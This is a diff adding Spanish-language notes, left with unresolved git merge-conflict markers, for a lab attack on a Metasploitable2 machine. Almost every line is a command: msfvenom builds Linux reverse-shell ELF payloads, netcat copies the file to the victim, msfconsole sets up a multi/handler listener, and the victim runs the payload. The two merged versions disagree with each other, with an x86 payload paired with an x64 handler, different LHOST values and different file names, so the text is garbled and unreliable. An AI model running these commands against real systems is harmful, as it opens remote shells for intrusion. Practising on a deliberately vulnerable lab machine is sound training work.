@@ -1,0 +1,60 @@
+
+<<<<<<< HEAD
+MAQUINA ATACANTE
+# Generar exploit de 32bits ya que esa es la arquitectura de metasploiteable2
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.28 LPORT=4444 -f elf -o shell32.elf
+
+
+## ENVIAR ARCHIVO
+
+MAQUINA VICTIMA
+nc -lvnp 8888 > shell.elf
+
+
+MAQUINA ATACANTE
+=======
+MAQUINA ATACANTE genera exploit
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.28 LPORT=4444 -f elf -a x86 --platform linux -o shell_old.elf
+
+## ENVIAR ARCHIVO
+
+Desde MAQUINA VICTIMA poner un puerto a la escucha para recibir archivo
+nc -lvnp 8888 > shell.elf
+
+
+MAQUINA ATACANTE envia el archivo
+>>>>>>> de5d17d9f25b99ba02580b063d1315cd22dce011
+nc -w 3 192.168.0.120 8888 < shell32.elf
+
+
+
+
+
+<<<<<<< HEAD
+MAQUINA ATACANTE
+
+msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.0.121
+set LPORT 4444
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j
+
+=======
+En MAQUINA ATACANTE poner meterpreter en escucha
+# En msfconsole
+jobs -K  # Matar el job actual
+
+use exploit/multi/handler
+set payload linux/x86/shell_reverse_tcp
+set LHOST 192.168.0.28
+set LPORT 4444
+set ExitOnSession false
+exploit -j
+
+
+En MAQUINA VICTIMA ejecutar el shell reverse
+./shell.elf
+>>>>>>> de5d17d9f25b99ba02580b063d1315cd22dce011
